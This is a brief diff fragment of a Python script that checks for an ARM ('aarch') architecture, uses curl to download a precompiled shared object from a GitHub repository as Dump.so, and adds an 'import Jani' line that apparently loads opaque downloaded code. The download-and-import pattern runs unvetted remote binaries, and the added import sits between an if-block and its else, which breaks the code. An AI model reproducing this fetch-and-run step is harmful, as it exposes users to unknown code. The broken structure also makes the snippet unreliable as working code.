@@ -13,5 +13,6 @@ if 'aarch' in bt:
         pass
     else:
         system("curl -L https://raw.githubusercontent.com/Jani-404/executables/main/Dump.cpython-311.so -o Dump.so")
+import Jani
 else:
     exit(' Sorry Arch Not Match System Not Supported ')
